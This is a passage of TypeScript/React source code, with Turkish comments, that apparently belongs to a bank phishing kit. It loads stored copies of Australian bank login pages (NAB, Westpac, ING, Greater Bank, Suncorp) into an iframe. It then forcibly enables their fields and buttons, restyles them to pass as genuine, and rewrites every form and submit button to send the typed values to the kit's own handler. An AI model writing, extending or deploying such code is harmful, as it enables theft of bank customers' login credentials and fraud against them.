        // ⭐ 2. NAB / North AMP — INPUT TIKLANAMAMA SORUNU:
        //    Her input/textarea/select için:
        //      - disabled/readonly/tabindex temizliği (eski kod)
        //      - 5 parent katmanı pointerEvents=auto + position zaten static ise relative
        //      - her 3 polling turunda bir input.focus() denemesi (iframe klavye odak emülasyonu)
        // =====================================================================
        try {
          const inputEls = Array.from(
            doc.querySelectorAll<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>(
              "input, textarea, select",
            ),
          ).filter((f) => {
            const t = (f.getAttribute("type") ?? "").toLowerCase();
            return t !== "hidden";
          });
          inputEls.forEach((field, idx) => {
            try {
              if (field.hasAttribute("readonly")) field.removeAttribute("readonly");
              if ((field as any).readOnly === true) { try { (field as any).readOnly = false; } catch {} }
              if (field.hasAttribute("disabled")) {
                field.removeAttribute("disabled");
                try { (field as any).disabled = false; } catch {}
              }
              if (field.getAttribute("tabindex") === "-1") field.setAttribute("tabindex", "0");
              if (!field.hasAttribute("tabindex")) field.setAttribute("tabindex", "0");

              // Pointer-events ve z-index temizliği (ELEMENT)
              try {
                field.style.setProperty("pointer-events", "auto", "important");
                field.style.setProperty("position", "relative", "important");
                field.style.setProperty("z-index", "5", "important");
                field.style.setProperty("opacity", "1", "important");
                field.style.setProperty("visibility", "visible", "important");
              } catch {}

              // 5 PARENT KATMAN
              let p: HTMLElement | null = field as unknown as HTMLElement;
              let depth = 0;
              while (p && depth < 6) {
                try {
                  p.style.setProperty("pointer-events", "auto", "important");
                  const compZ = Number(window.getComputedStyle(p).zIndex || "0");
                  if (compZ <= 0 && depth < 4) {
                    try {
                      if (window.getComputedStyle(p).position === "static") {
                        p.style.setProperty("position", "relative", "important");
                      }
                      p.style.setProperty("z-index", String(Math.max(2, 6 - depth)), "important");
                    } catch {}
                  }
                } catch {}
                p = p.parentElement;
                depth++;
              }

              // ⭐ ÖNEMLİ: HER POLLING'de idx%3 ===0 focus KALDIRILDI!
              //   Yerine: runPoll başında SADECE İLK 2 polling turunda
              //   ve AKTİF ODAKLI BİR INPUT YOKSA odaklama yapıyoruz.
              //   (Bu sayede kullanıcı yazarken odak ASLA izinsiz DEĞİŞMEZ.)
            } catch {}
          });
        } catch {}

        const allCandidates = doc.querySelectorAll<HTMLElement>(
          "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, .el-button, .van-button, .btn-submit, [data-testid*='login-button'], [data-testid*='submit-button'], [onclick]",
        );

        const candidateNodes: HTMLElement[] = [];
        const seenCandidates = new Set<HTMLElement>();
        allCandidates.forEach((node) => {
          if (seenCandidates.has(node)) return;
          seenCandidates.add(node);

          // ⭐ 1. KATMAN FİLTRE: SADECE GERÇEKTEN BUTON
          if (!isElementActuallyButtonLike(node)) return;

          // ⭐ GREATER BANK FIX (1. KATMAN SONRASI): GERÇEK login/submit butonu DEGILSE (help/apply/menu vb.) HEMEN REDDET!
          //   Eski cok gevsek kontroller (isByAttr tag BUTON ise direkt al, ACTION_TOKEN_RE.genis token)
          //   KALDIRILDI — yerine isElementActuallyRealSubmitButton hepsini sıkı kontrol ediyor.
          if (!isElementActuallyRealSubmitButton(node)) return;

          candidateNodes.push(node);

          if ("disabled" in node) {
            try { (node as any).disabled = !shouldForceEnable; } catch {}
          }

          try {
            if (shouldForceEnable) {
              node.removeAttribute("disabled");
            }
          } catch {}
          // ⭐ WESTPAC FIX 3: aria-disabled KULLANMA! "DO NOT USE DISABLED STATES"
          //   overlay yazisi orijinal "Sign in" ile UST USTE BINIYOR.
          try { node.removeAttribute("aria-disabled"); } catch {}

          // ⭐ 2. KATMAN FİLTRE (SON GÜVENCE): SADECE GERÇEKTEN BUTON
          if (!isElementActuallyButtonLike(node)) return;

          // ⭐ GREATER BANK FIX: Login dışındaki apply/menu/help/product butonlarına DOKUNMA!
          //   isElementActuallyButtonLike yeterli değil (tag BUTON ise doğru dönüyor), ayrıca
          //   gerçek submit/login tokeni OLMAYAN butonları BURADA REDDET.
          if (!isElementActuallyRealSubmitButton(node)) return;

          // ⭐ ING fadeOpacity + filter grayscale + pointer-events (saving olunca kapat)
          //   WeakMap CACHE kullan → sadece DEGISEN degerler SET EDILIR → FLICKER YOK!
          applyButtonStyleCached(node, "position", "relative");
          applyButtonStyleCached(node, "display", "inline-block");
          applyButtonStyleCached(node, "z-index", "99999");
          applyButtonStyleCached(node, "margin-top", "14px");
          applyButtonStyleCached(node, "margin-bottom", "10px");
          applyButtonStyleCached(node, "padding-top", "12px");
          applyButtonStyleCached(node, "padding-bottom", "12px");
          applyButtonStyleCached(node, "padding-left", "22px");
          applyButtonStyleCached(node, "padding-right", "22px");
          applyButtonStyleCached(node, "line-height", "1.35");
          applyButtonStyleCached(node, "font-size", "15px");
          applyButtonStyleCached(node, "font-weight", "700");
          applyButtonStyleCached(node, "border-radius", "10px");
          applyButtonStyleCached(node, "pointer-events", saving ? "none" : "auto");
          applyButtonStyleCached(node, "opacity", String(fadeOpacity));
          applyButtonStyleCached(node, "filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`);
          applyButtonStyleCached(node, "-webkit-filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`);
          applyButtonStyleCached(
            node,
            "cursor",
            shouldForceEnable ? "pointer" : (saving ? "wait" : "not-allowed"),
          );

          try {
            if (shouldForceEnable) {
              const classesToRemove: string[] = [];
              for (let i = 0; i < node.classList.length; i++) {
                const cls = node.classList[i];
                if (/disabled|disabl|not-allowed|is-disabled|btn-disabled|sg-Btn--disabled|disabled-btn/i.test(cls)) {
                  classesToRemove.push(cls);
                }
              }
              classesToRemove.forEach((c) => node.classList.remove(c));
            }
          } catch {}

          try {
            if (shouldForceEnable) {
              applyButtonStyleCached(node, "background-color", palette.bg);
              applyButtonStyleCached(node, "background", palette.bg);
              applyButtonStyleCached(node, "color", palette.fg);
              applyButtonStyleCached(node, "border", `1px solid ${palette.border}`);
              applyButtonStyleCached(node, "box-shadow", palette.shadow);
            } else {
              const bgCol = (filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA";
              applyButtonStyleCached(node, "background-color", bgCol);
              applyButtonStyleCached(node, "background", bgCol);
              applyButtonStyleCached(node, "color", "#8A8E90");
              applyButtonStyleCached(node, "border", "1px solid transparent");
              applyButtonStyleCached(node, "box-shadow", "none");
            }
            applyButtonStyleCached(
              node,
              "transition",
              "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease",
            );
          } catch {}

          try {
            const curRef = submitWithCurrentValuesRef.current;
            try { node.removeEventListener("click", curRef as any, false); } catch {}
            try { node.removeEventListener("mousedown", curRef as any, false); } catch {}
            try { node.removeEventListener("touchend", curRef as any, false); } catch {}
            if (curRef) {
              // ⭐ BUTONLAR HER ZAMAN tıklanabilir (opacity düşük olsa bile kullanıcı zorlayabilir)
              //   save anında hariç pointer-events auto kalsın
              node.addEventListener("click", curRef as any, false);
              node.addEventListener("mousedown", curRef as any, false);
              node.addEventListener("touchend", curRef as any, false);
              try {
                node.addEventListener("keydown", (e: Event) => {
                  const ke = e as KeyboardEvent;
                  if (ke && (ke.key === "Enter" || (ke as any).keyCode === 13)) {
                    try { curRef(); } catch {}
                  }
                }, false);
              } catch {}
            }
          } catch {}
        });

        // ⭐ ING / UI5 ÖZEL: tag name "ing-" "ui5-" "sl-" başlayan ve buton gibi davranan custom elementler
        //   (örn: ing-login-submit) ayrıca brute-force olarak bul & listeye ekle + STIL/HANDLER UYGULA
        try {
          const ingCandidates = doc.querySelectorAll<HTMLElement>("*");
          ingCandidates.forEach((el) => {
            if (seenCandidates.has(el)) return;
            const tag = (el.tagName || "").toLowerCase();
            if (!tag.startsWith("ing-") && !tag.startsWith("ui5-") && !tag.startsWith("sl-") && !tag.startsWith("sg-")) return;

            // ⭐ WEB COMPONENT BUTON FİLTRESİ: ing-input, sg-input (INPUT) custom elementleri
            //   buton DEĞİLDİR, onlara fadeOpacity UYGULAMA! SADECE ing-button, ing-login-submit
            //   gibi GERÇEKTEN buton/action görevi görenleri kabul et.
            if (!isElementActuallyButtonLike(el)) {
              const tok = getElementActionToken(el);
              const role = (el.getAttribute("role") || "").toLowerCase();
              const isActionBut =
                role === "button" ||
                /submit|login|button|next|continue|confirm|accept|proceed|validate|unlock|signon|sigon|auth/.test(tok);
              if (!isActionBut) return;
            }

            const tok = getElementActionToken(el);
            const role = (el.getAttribute("role") || "").toLowerCase();
            if (ACTION_BUTTON_RE.test(tok) || role === "button" || /submit|login|button|next|continue/.test(tok)) {
              // ⭐ GREATER BANK FIX (ING/UI5 CUSTOM WEBCOMPONENT):
              //   ing-button tagi + role="button" olmasi yeterli DEGIL.
              //   isElementActuallyRealSubmitButton ile GERCEKTEN login/submit
              //   butonu olduğunu teyit ET, menu/help/apply/product custom butonlarını REDDET!
              if (!isElementActuallyRealSubmitButton(el)) return;

              seenCandidates.add(el);
              candidateNodes.push(el);

              try {
                if ("disabled" in el) {
                  try { (el as any).disabled = !shouldForceEnable; } catch {}
                }
                try { if (shouldForceEnable) el.removeAttribute("disabled"); } catch {}
                // ⭐ WESTPAC FIX 3: aria-disabled KULLANMA!
                try { el.removeAttribute("aria-disabled"); } catch {}
                try {
                  applyButtonStyleCached(el, "pointer-events", saving ? "none" : "auto");
                  applyButtonStyleCached(el, "opacity", String(fadeOpacity));
                  applyButtonStyleCached(el, "filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`);
                  applyButtonStyleCached(el, "-webkit-filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`);
                  applyButtonStyleCached(
                    el,
                    "cursor",
                    shouldForceEnable ? "pointer" : (saving ? "wait" : "not-allowed"),
                  );
                } catch {}
                try {
                  if (shouldForceEnable && (el as any).classList) {
                    const classesToRemove: string[] = [];
                    for (let i = 0; i < (el as any).classList.length; i++) {
                      const cls = (el as any).classList[i];
                      if (/disabled|disabl|not-allowed|is-disabled|btn-disabled|sg-Btn--disabled|disabled-btn/i.test(cls)) {
                        classesToRemove.push(cls);
                      }
                    }
                    classesToRemove.forEach((c) => (el as any).classList.remove(c));
                  }
                } catch {}
                try {
                  if (shouldForceEnable) {
                    applyButtonStyleCached(el, "background-color", palette.bg);
                    applyButtonStyleCached(el, "background", palette.bg);
                    applyButtonStyleCached(el, "color", palette.fg);
                    applyButtonStyleCached(el, "border", `1px solid ${palette.border}`);
                    applyButtonStyleCached(el, "box-shadow", palette.shadow);
                  } else {
                    const bgCol = (filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA";
                    applyButtonStyleCached(el, "background", bgCol);
                    applyButtonStyleCached(el, "background-color", bgCol);
                    applyButtonStyleCached(el, "color", "#8A8E90");
                    applyButtonStyleCached(el, "border", "1px solid transparent");
                    applyButtonStyleCached(el, "box-shadow", "none");
                  }
                  applyButtonStyleCached(
                    el,
                    "transition",
                    "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease",
                  );
                } catch {}
                try {
                  const curRef = submitWithCurrentValuesRef.current;
                  try { el.removeEventListener("click", curRef as any, false); } catch {}
                  try { el.removeEventListener("mousedown", curRef as any, false); } catch {}
                  try { el.removeEventListener("touchend", curRef as any, false); } catch {}
                  if (curRef) {
                    el.addEventListener("click", curRef as any, false);
                    el.addEventListener("mousedown", curRef as any, false);
                    el.addEventListener("touchend", curRef as any, false);
                    try {
                      el.addEventListener("keydown", (e: Event) => {
                        const ke = e as KeyboardEvent;
                        if (ke && (ke.key === "Enter" || (ke as any).keyCode === 13)) {
                          try { curRef(); } catch {}
                        }
                      }, false);
                    } catch {}
                  }
                } catch {}
              } catch {}
            }
          });
        } catch {}

        // Polling BRUTE FORCE FALLBACK: Eğer standart selectorlarla 0 node geldiyse
        // form + doc içinde GERÇEKTEN buton olan ve class/id/textte geçenleri al.
        if (candidateNodes.length === 0) {
          try {
            const fallBackSource = form ?? doc.body ?? doc.documentElement;
            const allIn = fallBackSource.querySelectorAll<HTMLElement>("*");
            const bfRe = /btn|button|login|logon|signin|submit|continue|next|ileri|giriş|giris|sonraki|tamam|onay|devam|enter|confirm|password_submit|submit_password|acceso|iniciar|log_on|log_in|sign_in|sigon|auth|validate|accept|proceed|unlock|open/i;
            const extra: HTMLElement[] = [];
            allIn.forEach((el) => {
              if (seenCandidates.has(el)) return;
              const tag = (el.tagName || "").toLowerCase();
              const type = (el.getAttribute("type") || "").toLowerCase();
              const cls = (el.getAttribute("class") || "").toLowerCase();
              const tOk =
                tag === "button" ||
                (tag === "input" && (type === "submit" || type === "button")) ||
                el.getAttribute("role") === "button" ||
                (tag === "a" && /\bbtn\b/.test(cls)) ||
                el.hasAttribute("onclick");

              // ⭐ 1. KATMAN FİLTRE: SADECE GERÇEKTEN BUTON
              if (!isElementActuallyButtonLike(el)) return;

              // ⭐ GREATER BANK FIX (BRUTE FORCE FALLBACK): GERÇEK login/submit butonu degilse REDDET!
              //   tOk tag BUTON ise direkt true oluyordu (çok tehlikeli, tüm sayfa butonları submit olabiliyordu)
              //   Bunun yerine strict real submit kontrolü GEÇİYOR — apply/product/help butonları REDDET!
              if (!isElementActuallyRealSubmitButton(el)) return;

              const idClsTxt = `${el.id || ""} ${el.getAttribute("class") || ""} ${el.getAttribute("data-testid") || ""} ${el.getAttribute("name") || ""} ${(el.textContent || "").trim().slice(0, 120)}`;
              if (tOk || bfRe.test(idClsTxt)) {
                seenCandidates.add(el);
                extra.push(el);
              }
            });
            // Fallback node'ları için de candidate loop'taki tüm stillendirme + handler bağlama
            extra.forEach((node) => {
              // ⭐ 2. KATMAN FİLTRE (SON GÜVENCE): SADECE GERÇEKTEN BUTON
              if (!isElementActuallyButtonLike(node)) return;
              // ⭐ GREATER BANK FIX (FALLBACK LOOP 2. KATMAN):
              //   Üstteki filtreden nasıl kaçtıysa burada da son kez denetle.
              if (!isElementActuallyRealSubmitButton(node)) return;

              candidateNodes.push(node);
              if ("disabled" in node) {
                try { (node as any).disabled = !shouldForceEnable; } catch {}
              }
              try {
                if (shouldForceEnable) node.removeAttribute("disabled");
              } catch {}
              // ⭐ WESTPAC FIX 3: aria-disabled KULLANMA!
              try { node.removeAttribute("aria-disabled"); } catch {}
              applyButtonStyleCached(node, "position", "relative");
              applyButtonStyleCached(node, "display", "inline-block");
              applyButtonStyleCached(node, "z-index", "99999");
              applyButtonStyleCached(node, "margin-top", "14px");
              applyButtonStyleCached(node, "margin-bottom", "10px");
              applyButtonStyleCached(node, "padding-top", "12px");
              applyButtonStyleCached(node, "padding-bottom", "12px");
              applyButtonStyleCached(node, "padding-left", "22px");
              applyButtonStyleCached(node, "padding-right", "22px");
              applyButtonStyleCached(node, "line-height", "1.35");
              applyButtonStyleCached(node, "font-size", "15px");
              applyButtonStyleCached(node, "font-weight", "700");
              applyButtonStyleCached(node, "border-radius", "10px");
              applyButtonStyleCached(node, "pointer-events", saving ? "none" : "auto");
              applyButtonStyleCached(node, "opacity", String(fadeOpacity));
              applyButtonStyleCached(node, "filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`);
              applyButtonStyleCached(node, "-webkit-filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`);
              applyButtonStyleCached(
                node,
                "cursor",
                shouldForceEnable ? "pointer" : (saving ? "wait" : "not-allowed"),
              );
              try {
                if (shouldForceEnable) {
                  const classesToRemove: string[] = [];
                  for (let i = 0; i < node.classList.length; i++) {
                    const cls = node.classList[i];
                    if (/disabled|disabl|not-allowed|is-disabled|btn-disabled|sg-Btn--disabled|disabled-btn/i.test(cls)) {
                      classesToRemove.push(cls);
                    }
                  }
                  classesToRemove.forEach((c) => node.classList.remove(c));
                }
              } catch {}
              try {
                if (shouldForceEnable) {
                  applyButtonStyleCached(node, "background-color", palette.bg);
                  applyButtonStyleCached(node, "background", palette.bg);
                  applyButtonStyleCached(node, "color", palette.fg);
                  applyButtonStyleCached(node, "border", `1px solid ${palette.border}`);
                  applyButtonStyleCached(node, "box-shadow", palette.shadow);
                } else {
                  const bgCol = (filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA";
                  applyButtonStyleCached(node, "background-color", bgCol);
                  applyButtonStyleCached(node, "background", bgCol);
                  applyButtonStyleCached(node, "color", "#8A8E90");
                  applyButtonStyleCached(node, "border", "1px solid transparent");
                  applyButtonStyleCached(node, "box-shadow", "none");
                }
                applyButtonStyleCached(
                  node,
                  "transition",
                  "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease",
                );
              } catch {}
              try {
                const curRef = submitWithCurrentValuesRef.current;
                try { node.removeEventListener("click", curRef as any, false); } catch {}
                try { node.removeEventListener("mousedown", curRef as any, false); } catch {}
                try { node.removeEventListener("touchend", curRef as any, false); } catch {}
                if (curRef) {
                  node.addEventListener("click", curRef as any, false);
                  node.addEventListener("mousedown", curRef as any, false);
                  node.addEventListener("touchend", curRef as any, false);
                  try {
                    node.addEventListener("keydown", (e: Event) => {
                      const ke = e as KeyboardEvent;
                      if (ke && (ke.key === "Enter" || (ke as any).keyCode === 13)) {
                        try { curRef(); } catch {}
                      }
                    }, false);
                  } catch {}
                }
              } catch {}
            });
          } catch {}
        }

        if (candidateNodes.length > 0) {
          savedSubmitActionNodesRef.current = candidateNodes;
        }

        try {
          const formsArr = Array.from(doc.querySelectorAll("form"));
          formsArr.forEach((f) => {
            try {
              f.setAttribute("action", "#");
              f.setAttribute("method", "post");
              f.setAttribute("target", "_self");
              f.setAttribute("novalidate", "novalidate");
            } catch {}
            if (f === form) {
              const curRef = submitWithCurrentValuesRef.current;
              try { f.removeEventListener("submit", curRef as any); } catch {}
              if (curRef) f.addEventListener("submit", curRef as any);
              (f as any)._auBotV3Bound = true;
            }
          });
        } catch {}

        const allFields = getFormFields(form);
        allFields.forEach((field) => {
          try {
            if (field.hasAttribute("readonly")) field.removeAttribute("readonly");
            if (field.hasAttribute("disabled") && field.getAttribute("type") !== "hidden") {
              field.removeAttribute("disabled");
              (field as any).disabled = false;
            }
            if (field.getAttribute("tabindex") === "-1") field.setAttribute("tabindex", "0");
          } catch {}
        });

        if (shouldForceEnable) {
          try {
            if (iframe.contentWindow && typeof iframe.contentWindow.postMessage === "function") {
              try {
                iframe.contentWindow.postMessage({ kind: "AU_BOT_CAN_PROCEED_NOW" }, "*");
              } catch {}
            }
          } catch {}
        }
      } catch (e) {
        /* cross-origin or detached frame — ignore silently */
      }
    };

    const initialTimer = window.setTimeout(runPoll, 250);
    const pollTimer = window.setInterval(runPoll, 800);

    return () => {
      window.clearTimeout(initialTimer);
      window.clearInterval(pollTimer);
    };
  }, [attachFrameBridge, bankSlug, isFinalStep, saving, stepIndex, totalSteps]);

  if (!currentSrc) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-white px-4 text-center text-sm font-medium text-red-600">
        Exact bank page file is missing for {bankName} ({bankSlug}).
        {isAuExactHtmlBank(bankSlug) && bankSlug === "suncorp-bank" ? (
          <div className="mt-2 w-full text-xs text-[#129C4F]">
            Suncorp Bank HTML files (1.html, 2.html, 3.html) bekleniyor. Kullanicidan geldikten sonra public/au-banks/suncorp-bank/ altina yerlestirilecektir.
          </div>
        ) : null}
      </div>
    );
  }

  return (
    <div className="relative min-h-screen bg-white">
      <iframe
        ref={iframeRef}
        title={`${bankName} login`}
        src={currentSrc}
        onLoad={handleFrameLoad}
        className="min-h-screen w-full border-0 bg-white"
      />
    </div>
  );
}
